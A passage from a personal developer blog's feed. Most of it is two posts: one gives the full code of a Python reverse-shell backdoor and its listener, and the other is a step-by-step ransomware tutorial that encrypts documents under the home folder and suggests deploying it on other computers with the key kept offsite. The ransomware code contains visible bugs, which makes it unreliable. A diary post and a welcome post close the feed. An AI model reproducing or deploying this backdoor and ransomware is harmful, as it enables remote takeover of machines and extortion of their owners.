    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ pyinstaller --onefile goatse.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;/h2&gt;
&lt;p&gt;server.py&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#import socket API module
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# for LAN you can use your pc&apos;s ip.
# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc&apos;s ip address.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.1.1&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Server is online&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Listening for callback&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#listening for callback
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#will display once callback is initiated
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;[+] &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; She spreads the legs, it is time&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;goatse.py&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#import socket and subprocess modules, subprocess module allows us to run commands on our target machine.
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;


&lt;span class=&quot;c1&quot;&gt;#don&apos;t forget to set the correct server ip address and port in order for this to callback home.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.1.1&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#after successfull callback to home, goatse will start to listen for commands from server
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;#this decodes the user command from sent from server
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;#then executes command and read the output/error
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;output_error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserInput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;license&quot;&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://choosealicense.com/licenses/bsd-3-clause/&quot;&gt;BSD 3-Clause “New” or “Revised” License&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources:&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AdrianDucao/goatse&quot;&gt;Github Repo&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Happy Coding.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">goatse a proof of concept backdoor for the most bare-bone access</summary></entry><entry><title type="html">Ransomware Proof of concept</title><link href="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html" rel="alternate" type="text/html" title="Ransomware Proof of concept" /><published>2020-08-29T06:00:00+08:00</published><updated>2020-08-29T06:00:00+08:00</updated><id>http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware</id><content type="html" xml:base="http://localhost:4000/coding/2020/08/29/proof-of-concept-ransomware.html">&lt;h3 id=&quot;ransomware-concept&quot;&gt;Ransomware Concept&lt;/h3&gt;
&lt;p&gt;The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here &lt;a href=&quot;https://github.com/AdrianDucao/run-some-crypt&quot;&gt;run-some-crypt&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;content&quot;&gt;Content&lt;/h4&gt;
&lt;ol&gt;
  &lt;li&gt;generate a key to be used for encryption and decryption&lt;/li&gt;
  &lt;li&gt;write a key file&lt;/li&gt;
  &lt;li&gt;read a key file&lt;/li&gt;
  &lt;li&gt;scanning directory&lt;/li&gt;
  &lt;li&gt;encypt the target files&lt;/li&gt;
  &lt;li&gt;create cli interface&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;generate-a-key-to-be-used-for-encryption-and-decryption&quot;&gt;generate a key to be used for encryption and decryption&lt;/h3&gt;
&lt;p&gt;Let’s begin by importing the OS module since we can use its functions for interactions with the OS, for encryption we can import the &lt;a href=&quot;https://cryptography.io/en/latest/fernet/&quot;&gt;Fernet(Semantic Encrytion)&lt;/a&gt; Module.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  1 import os
  2 from os.path import expanduser
  3 from cryptography.fernet import Fernet

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;create a class and constructor, below that is the generateKey function&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  5 class Encrypt:
  6 
  7     def __init__(self):
  8 
  9         self.key = None
 10         self.cryptor = None
 11         self.file_ext_targets = [&apos;pdf&apos;,&apos;doc&apos;,&apos;docx&apos;,&apos;ppt&apos;,&apos;pptx&apos;,&apos;txt&apos;]
 12 
 13     def generateKey(self):
 14 
 15         self.key = Fernet.generate_key()
 16         self.cryptor = Fernet(self.key)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;write-a-key-file&quot;&gt;write a key file&lt;/h3&gt;
&lt;p&gt;now lets create a function to write the key to a file&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 23     def writeKey(self, key_filename):
 24         with open.(key_filename, &apos;b&apos;) as f:
 25             f.write(self.key)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;read-a-key-file&quot;&gt;read a key file&lt;/h3&gt;
&lt;p&gt;moving on, create a function to read a key from a file&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 18     def readKey(self, key_filename):
 19         with open(key_filename, &apos;a&apos;) as f:
 20             self.key = f.read()
 21             self.cryptor = Fernet(self.key)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scanning-directory&quot;&gt;scanning directory&lt;/h3&gt;
&lt;p&gt;the function below allows you to scan the directories and check for target filename extensions specified earlier on self.file_ext_targets&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 28     def mainCrypt(self, root_dir, encrypted = False):
 29         for root, _, files in os.walk(root_dir):
 30             for f in files:
 31                 abs_file_path = os.path.join(root, f)
 32 
 33                 if not abs_file_path(&apos;.&apos;)[-1] in self.file_ext_targets:
 34                     continue
 35 
 36                 self.crypt_file(abs_file_path, encrypted = encrypted)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;encrypt-the-target-files&quot;&gt;encrypt the target files&lt;/h3&gt;
&lt;p&gt;function to encrypt the specified filename extensions and check if that file has been encrypted or not&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 38     def encryptFile(self, file_path, encrypted = False):
 39         with open(file_path, &apos;a+&apos;) as f:
 40             _data = f.read()
 41 
 42             if not encrypted:
 43                 data = self.cryptor.encrypt(_data)
 44             else
 45                 data = self.cryptor.decrypt(_data)
 46 
 47             f.seek(0)
 48             f.write(data)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;create-a-cli-interface&quot;&gt;create a cli interface&lt;/h3&gt;
&lt;p&gt;how it works is that you call the class we created earlier and create a conditional statement where you can specify and action you want to take e.g. encrypt or decrypt files.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 51 if __name__ == &apos;__main__&apos;:
 52     #all directory
 53     sys_root = expanduser(&apos;~&apos;)
 54 
 55     #specific target directory
 56     #local_root= &apos;.&apos;
 57 
 58     import argparse
 59     parser = argparse.ArgumentParser()
 60     parser.add_argument(&apos;--action&apos;, required=True)
 61     parser.add_argument(&apos;--keyfile&apos;)
 62 
 63 
 64     args = parser.parse_args()
 65     action = args.action.lower()
 66     keyfile = args.keyfile
 67 
 68     lock = Encrypt()
 69 
 70     if action == &apos;decrypt&apos;:
 71         if keyfile is None:
 72             print(&apos;Specify path to keyfile after --keyfile&apos;)
 73         else:
 74             lock.read_key(keyfile)
 75             lock.mainCrypt(local_root, encrypted=True)
 76     elif action == &apos;encrypt&apos;:
 77         lock.generate_key()
 78         lock.write_key(&apos;keyfile&apos;)
 79         lock.mainCrypt(sys_root)


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;After that typing, you’re set and done. If you are planning to use this to another computer, you can create an executable file to run this code set an offsite server to host and store the keyfile for later use. Another use case for this is to make a secure encrypted files inside your flash drive or hard drive, as long as you have the keyfile or know the key you’re the only one who can open those files. It’s not a matter of if but when the quantum computers will comes to age, privacy and secuity through encryption might disappear.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 crypt.py --action encrypt

$ python3 crypt.py --action decrypt --keyfile /path/keyfile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Happy Hunting.&lt;/p&gt;</content><author><name></name></author><category term="coding" /><summary type="html">Ransomware Concept The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here run-some-crypt.</summary></entry><entry><title type="html">The year i love and hate</title><link href="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html" rel="alternate" type="text/html" title="The year i love and hate" /><published>2020-08-12T12:15:00+08:00</published><updated>2020-08-12T12:15:00+08:00</updated><id>http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate</id><content type="html" xml:base="http://localhost:4000/blog/2020/08/12/The-year-i-love-and-hate.html">&lt;h3 id=&quot;pandemic-shtf&quot;&gt;Pandemic SHTF&lt;/h3&gt;

&lt;p&gt;The year the Pandemic SHTF, limited access, limited movement, and limited productive things to do. It all started just with subtle cases, deaths, and recoveries on the month January and it went nuts by the month of March, But this situation at hand there’s a noticable growth on creativity and financial awareness of masses, maybe they realized that they haven’t prepare for this sort of thing or have the capacity to deal with the unemployment and restriction nonetheless i did notice the urge of people to get rid with the boredom of being confined in their own houses, social media and other ways of entertainment are one of many choices we have to get rid of this feeling of boredom. I however want to explore things that i’ve missed for couple of years, since i started working i haven’t had enough time to learn and ponder on the things i like the most which are programming, web development, and business.&lt;/p&gt;

&lt;h3 id=&quot;perspective&quot;&gt;Perspective&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;March 16, 2020&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I was at the office when the lockdown procedure began in Metro Manila, most of our collegues has a transportation readily available prepared by our company, however they didn’t account that they have employees that lives on the northern area of Metro Manila, most buses we see that day have a Southern Metro Manila Signs and nothing, not 1 transporation vehicle is available for us coming from the nothern metro. Nevertheless i wanted to go home after a long day of work i have to take a rest, but there’s no public transporation avaible since the lockdown procedure prohibits the operation of public transportation vehicles, Inn order for me to go home, I’m forced to take the hardway and walked from Buendia Makati to Sampaloc Manila that’s at least 10km or 7.21 miles distance, luckily the heat of the sun isn’t that harsh at that time.&lt;/p&gt;

&lt;h3 id=&quot;boredom-strikes&quot;&gt;Boredom Strikes&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;March 23, 2020&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I began to look for a fun way to kill time, I started searching for 2D Game Development and i did just that here’s the link &lt;a href=&quot;https://github.com/AdrianDucao/Game-Dev-Practice&quot;&gt;Game-Dev-Practice&lt;/a&gt;. But most of the i just binge watch youtube and watch movies on my Plex Server.&lt;/p&gt;

&lt;h3 id=&quot;thinkering&quot;&gt;Thinkering&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;March 28, 2020&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I started to create a game and a subpar story for it here’s the link of unfinished game dev &lt;a href=&quot;https://github.com/AdrianDucao/Explorer19&quot;&gt;Explorer19&lt;/a&gt;, i always have this facination of end of the world scenarios, when i was a kid, i love to draw war scenarios with stick figures and i love playing games like Left 4 Dead when i was in elementary, i don’t know about this but i think this quote is true;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;“Everyone, deep in their hearts, is waiting for the end of the world to come.” — Haruki Murakami&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;refresher&quot;&gt;Refresher&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;April 10, 2020&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;a-new-journey-had-began&quot;&gt;A new journey had began&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;June 01, 2020&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the day i’ve decided with my best of friends to register a business for our new venture, &lt;a href=&quot;https://rpointsolution.com&quot;&gt;RPOINT IT SOLUTIONS&lt;/a&gt;, since it’s the height of pandemic we can only do and move so much so there’s that we’ll have to work it out until the end of 2021.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Pandemic SHTF</summary></entry><entry><title type="html">Welcome to adrianducao.github.io</title><link href="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html" rel="alternate" type="text/html" title="Welcome to adrianducao.github.io" /><published>2020-04-06T12:47:36+08:00</published><updated>2020-04-06T12:47:36+08:00</updated><id>http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2020/04/06/welcome-to-adrianducao.github.io.html">&lt;p&gt;This static website will mainly show my daily or weekly blog post about Programming, Web App Development, Security and other stuff while learning things.&lt;/p&gt;

&lt;!-- 
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 --&gt;

&lt;!-- Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].

[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/ --&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">This static website will mainly show my daily or weekly blog post about Programming, Web App Development, Security and other stuff while learning things.</summary></entry></feed>